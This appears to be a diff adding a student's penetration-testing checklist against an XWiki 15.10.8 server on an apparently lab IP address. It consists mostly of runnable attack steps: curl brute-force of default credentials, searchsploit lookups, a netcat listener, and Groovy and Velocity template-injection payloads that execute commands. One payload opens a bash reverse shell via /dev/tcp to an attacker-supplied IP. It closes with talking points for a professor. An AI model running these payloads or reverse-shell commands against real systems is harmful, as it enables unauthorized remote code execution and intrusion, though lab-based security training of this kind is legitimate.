@@ -1,0 +1,144 @@
+# IMMEDIATE ACTIONS - Run These Commands NOW
+
+# ============================================
+# 1. CHECK LOGIN RESULTS (2 minutes)
+# ============================================
+
+# List all login attempt files
+ls -la login_*.html
+
+# Check each login result
+cat login_admin.html | head -50
+cat login_xwiki.html | head -50
+cat login_admin2.html | head -50
+cat login_admin3.html | head -50
+
+# Look for success indicators
+grep -i "logout\|dashboard\|welcome\|main\|error" login_*.html
+
+# ============================================
+# 2. CHECK XWIKI STATUS (2 minutes)
+# ============================================
+
+# Check if still initializing
+curl -s http://10.129.7.80:8080/xwiki/ | grep -i "initializing"
+
+# Check main page
+curl -s http://10.129.7.80:8080/xwiki/bin/view/Main/WebHome | head -50
+
+# Check if anonymous access works
+curl -s http://10.129.7.80:8080/xwiki/bin/edit/Main/TestPage | head -50
+
+# ============================================
+# 3. TRY MORE CREDENTIALS (5 minutes)
+# ============================================
+
+# Try admin/password
+curl -s -X POST http://10.129.7.80:8080/xwiki/bin/login/XWiki/XWikiLogin \
+    -d "j_username=admin&j_password=password" \
+    -L -c cookies_test.txt -o login_test1.html
+
+# Try admin/123456
+curl -s -X POST http://10.129.7.80:8080/xwiki/bin/login/XWiki/XWikiLogin \
+    -d "j_username=admin&j_password=123456" \
+    -L -c cookies_test.txt -o login_test2.html
+
+# Try Admin/admin (capital A)
+curl -s -X POST http://10.129.7.80:8080/xwiki/bin/login/XWiki/XWikiLogin \
+    -d "j_username=Admin&j_password=admin" \
+    -L -c cookies_test.txt -o login_test3.html
+
+# Check results
+grep -i "logout\|dashboard\|welcome" login_test*.html
+
+# ============================================
+# 4. SEARCH FOR EXPLOITS (5 minutes)
+# ============================================
+
+# Search exploit database
+searchsploit xwiki 15.10
+
+# Search for XWiki 15.x
+searchsploit xwiki 15
+
+# Search for template injection
+searchsploit xwiki template
+
+# ============================================
+# 5. PREPARE FOR TEMPLATE INJECTION (10 minutes)
+# ============================================
+
+# Get your IP address
+ip addr show tun0 | grep inet
+# OR
+ifconfig | grep inet
+
+# Set up reverse shell listener (in NEW terminal)
+# nc -lvp 4444
+
+# ============================================
+# 6. TRY TEMPLATE INJECTION (30 minutes) ⭐
+# ============================================
+
+# If you have ANY access (even anonymous), try this:
+
+# Test command execution:
+# Go to: http://10.129.7.80:8080/xwiki
+# Create/edit page with:
+{{groovy}}
+def proc = 'whoami'.execute()
+proc.waitFor()
+println proc.text
+{{/groovy}}
+
+# If that works, try reverse shell:
+# Replace YOUR_IP with your Kali IP
+{{groovy}}
+def proc = 'bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"'.execute()
+proc.waitFor()
+{{/groovy}}
+
+# Alternative: Velocity template
+#set($exec = $xwiki.getClass().forName('java.lang.Runtime').getRuntime().exec('whoami'))
+#set($is = $exec.getInputStream())
+#foreach($i in [1..$is.available()])
+$is.read()
+#end
+
+# ============================================
+# 7. DOCUMENT EVERYTHING (10 minutes)
+# ============================================
+
+# Create documentation folder
+mkdir -p ~/xwiki_documentation_$(date +%Y%m%d_%H%M%S)
+cd ~/xwiki_documentation_*
+
+# Save all outputs
+echo "=== XWiki Exploitation Documentation ===" > report.txt
+date >> report.txt
+echo "" >> report.txt
+echo "Target: 10.129.7.80:8080" >> report.txt
+echo "Version: 15.10.8" >> report.txt
+echo "" >> report.txt
+echo "=== Commands Executed ===" >> report.txt
+history | tail -50 >> report.txt
+
+# Save login attempts
+cp ~/Downloads/login_*.html . 2>/dev/null
+
+# ============================================
+# WHAT TO TELL PROFESSOR
+# ============================================
+
+# 1. "I've completed reconnaissance and identified XWiki 15.10.8"
+# 2. "I've attempted authentication with default credentials"
+# 3. "My next step is template injection for RCE, which is the primary attack vector"
+# 4. "I'm also searching for known CVEs for this version"
+# 5. "I'm documenting all attempts following PTES methodology"
+
+# Even if exploitation doesn't work, you can explain:
+# - The methodology you're following
+# - The attack vectors you've identified
+# - The commands you've run
+# - What you would do next given more time
+
